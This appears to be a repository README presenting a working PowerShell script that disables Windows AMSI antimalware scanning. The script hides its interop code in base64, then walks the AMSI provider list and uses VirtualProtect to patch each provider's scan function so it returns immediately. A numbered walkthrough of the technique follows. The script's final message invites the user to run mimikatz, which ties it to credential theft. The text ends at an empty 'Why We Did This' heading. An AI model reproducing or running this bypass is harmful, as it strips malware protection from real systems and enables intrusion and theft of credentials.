## Overview

This repository houses a PowerShell script engineered to circumvent the AMSI. AMSI serves as a security feature, allowing integration with antivirus and antimalware products to bolster threat protection. 

## Script
```pwsh
$g = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KcHVibGljIGNsYXNzIEFwaXMgew0KICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIFVJbnRQdHIgZHdTaXplLCB1aW50IGZsTmV3UHJvdGVjdCwgb3V0IHVpbnQgbHBmbE9sZFByb3RlY3QpOw0KICBbRGxsSW1wb3J0KCJhbXNpIildDQogIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBBbXNpSW5pdGlhbGl6ZShzdHJpbmcgYXBwTmFtZSwgb3V0IEludDY0IGNvbnRleHQpOw0KfQ=='))

Add-Type $g

$r = [Convert]::FromBase64String('uLgA/wDD')
$y = 0; $i = 0
$SIZE_OF_PTR = 8
[Int64]$z = 0

# Initializing AMSI
try {
    [Apis]::AmsiInitialize("MyScanner", [ref]$z)
    Write-Host "AMSI initialized successfully. Context: $z"

    # Retrieve pointers for AMSI providers
    $b = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$z, 16)
    Write-Host "Providers pointer: $b"

    $c = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$b, 64)
    Write-Host "Initial provider pointer: $c"
} catch {
    Write-Host "Error during AMSI initialization or pointer retrieval: $_"
    exit 1
}

# Iterate through AMSI providers
try {
    while ($c -ne 0) {
        $d = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$c)
        $e = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$d, 24)
        Write-Host "[$i] Provider's scan function found at address: $e"

        if (![Apis]::VirtualProtect($e, [uint32]6, 0x40, [ref]$y)) {
            throw "Failed to change memory protection at address: $e"
        }

        [System.Runtime.InteropServices.Marshal]::Copy($r, 0, [IntPtr]$e, 6)
        Write-Host "[$i] Scan function patched successfully."

        $i++
        $c = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$b, 64 + ($i * $SIZE_OF_PTR))
    }
    Write-Host "Patching completed successfully."
    Write-Host "You can Invoke mimikatz now (: "
} catch {
    Write-Host "Error during provider iteration and patching: $_"
    exit 1
}
```



## Script Approach

The script adopts a methodical approach to achieve its goal:

1. **Initialization**: Commencing with AMSI initialization, the script retrieves pointers to AMSI providers.
2. **Provider Iteration**: It iterates through each AMSI provider, pinpointing their respective scan functions.
3. **Function Patching**: Upon locating the scan function, the script patches it with a `RET 0` instruction, it terminates the scan function immediately upon being called (It's like saying "end the function and return successfully")
4. **Memory Protection**: Before applying patches, the script adjusts the memory protection of the scan function to permit writing.
5. **Iterative Patching**: The script repeats this process for all available AMSI providers.

## Why We Did This
